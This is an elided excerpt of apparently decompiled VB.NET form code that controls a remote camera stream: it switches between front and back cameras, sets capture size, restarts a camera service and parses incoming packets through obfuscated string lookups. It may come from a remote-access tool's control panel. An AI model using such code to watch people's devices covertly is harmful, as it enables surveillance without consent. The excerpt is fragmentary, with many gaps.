    ...
    Private Sub PBox_Paint(sender As Object, e As PaintEventArgs) Handles PBox.Paint
        Try
            ...
            If flag Then
                ...
                'Dim flag4 As Boolean = Me.mPoint.X < size.Width And Me.mPoint.Y > Me.PBox.Size.Height - 50 'If hover fps box, hide fps
                Dim flag4 = False 'Show/Hide FPS false=>show true=>hide
            ...
            If flag19 Then
                ...
                If flag20 Then
                    ...
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias
                    Dim text3 As String = "Stream will be back soon..."
...
IL_A88:
    ...
    Private Sub SELCAM(ByVal sender As Object, ByVal e As EventArgs)
        Dim cam_before As String = Nothing
        Dim cam_after As String = Nothing
        Dim cam_changed As String = Nothing
        Dim cam_text As String = Nothing
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                cam_before = Me.SelCamera.Tag
                Me.SelCamera.Tag = tag
                If (tag = 1) Then
                    cam_text = "Front Camera"
                Else
                    cam_text = "Back Camera"
                End If
                Me.SelCamera.TxText = String.Concat(cam_text)
                Me.SelCamera.Refresh()
                cam_after = Me.SelCamera.Tag
            End If

            'Control camera changed or not
            If String.Compare(cam_before, cam_after) = 0 Then
                cam_changed = "0"
            Else
                cam_changed = "1"
            End If
        ...
        'Resume capture on camera change
        If (Me.go = True And cam_changed = "1") Then
            Me.STALABSTOP()
            Me.Packet = CLng(0)
            Me.StrText0 = "Camera Changed..."
            Me.Doyouwrite = True
            Me.go = False
            Me.RF.Enabled = True
    ...
    Private Sub SELSZ(ByVal sender As Object, ByVal e As EventArgs)
        Dim size_before As String = Nothing
        Dim size_after As String = Nothing
        Dim size_changed As String = Nothing
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                size_before = Me.SIZLAB.Tag
                Me.SIZLAB.Tag = tag
                Me.SIZLAB.TxText = String.Concat("Size:", tag)
                Me.SIZLAB.Refresh()
                size_after = Me.SIZLAB.Tag
            End If

            'Control size changed or not
            If String.Compare(size_before, size_after) = 0 Then
                size_changed = "0"
            Else
                size_changed = "1"
            End If
        ...
        'Resume capture on size change
        If (Me.go = True And size_changed = "1") Then
            Me.STALABSTOP()
            Me.Packet = CLng(0)
            Me.StrText0 = "Size Changed..."
            Me.Doyouwrite = True
            Me.go = False
            Me.RF.Enabled = True
            Me.StartServiceCamera()
    ...
    Private Sub STALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles STALAB.Click
        Try
            If (Me.SelCamera.TxText = "Front Camera") Then
    ...
    Private Sub STALABSTOP()
        ...
        Me.FrontCamera.Enabled = True
        Me.BackCamera.Enabled = True
            ...
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                If (Not Me.lock) Then
                    ...
                    Do
                        ...
                        Dim camera_text As String = Nothing
                        If (Operators.CompareString(str, Store.BFF(Store.buff, CLng(93)), False) = 0) Then
                            ...
                            If (Me.SelCamera.Tag = "1") Then
                                camera_text = "Front Camera"
                            Else
                                camera_text = "Back Camera"
                            End If
                            Me.SelCamera.TxText = String.Concat(camera_text)
                            Me.SelCamera.Refresh()
                            ...
                            If (CInt(strArrays2.Length) = 2) Then
                                Try
                                    flag = If(Not (strArrays2(0).Length < 5 And strArrays2(1).Length < 5 And Conversions.ToInteger(strArrays2(0).Trim()) >= 320 And Conversions.ToInteger(strArrays2(0).Trim()) <= 1440 And Conversions.ToInteger(strArrays2(1).Trim()) >= 288 And Conversions.ToInteger(strArrays2(1).Trim()) <= 1440), False, True)
                                Catch exception As System.Exception
                                    flag = False
                                End Try
                            End If
    ...
    Private Sub LBFOC_Click(sender As Object, e As EventArgs) Handles LBFOC.Click

    End Sub

    Private Sub LBFLMO_Click(sender As Object, e As EventArgs) Handles LBFLMO.Click

    End Sub

    Private Sub BackCamera_Click(sender As Object, e As EventArgs) Handles BackCamera.Click
        Me.SelCamera.TxText = "Back Camera"
        Me.SelCamera.Refresh()

        If (Me.go = True) Then
            Me.STALABSTOP()
            Me.SelCamera.Tag = 0
            Me.StrText0 = "Back Camera"
            Me.Doyouwrite = True
            Me.go = False
            Me.RF.Enabled = True
            Me.StartServiceCamera()
    ...
    Private Sub FrontCamera_Click(sender As Object, e As EventArgs) Handles FrontCamera.Click
        Me.SelCamera.TxText = "Front Camera"
        Me.SelCamera.Refresh()

        If (Me.go = True) Then
            Me.STALABSTOP()
            Me.SelCamera.Tag = 1
            Me.StrText0 = "Front Camera"
            Me.Doyouwrite = True
            Me.go = False
            Me.RF.Enabled = True
            Me.StartServiceCamera()
